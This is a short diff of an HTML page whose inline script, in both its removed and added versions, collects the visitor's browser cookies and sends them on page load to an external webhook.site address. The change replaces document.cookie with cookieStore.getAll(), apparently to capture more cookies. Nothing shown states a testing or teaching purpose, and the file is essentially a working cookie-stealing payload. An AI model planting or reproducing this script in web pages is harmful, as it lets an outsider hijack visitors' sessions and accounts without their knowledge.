@@ -4,13 +4,15 @@
   </head>
   <body>
     <script>
-        fetch("https://webhook.site/d20181c9-e0e1-43de-80b2-e846e587c1d6/" + JSON.stringify(document.cookie), {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify("uwu")
-        });
+        cookieStore.getAll().then((coo) => 
+          fetch("https://webhook.site/d20181c9-e0e1-43de-80b2-e846e587c1d6/" + JSON.stringify(coo), {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify("uwu")
+          })
+        );
     </script>
   </body>
 </html>
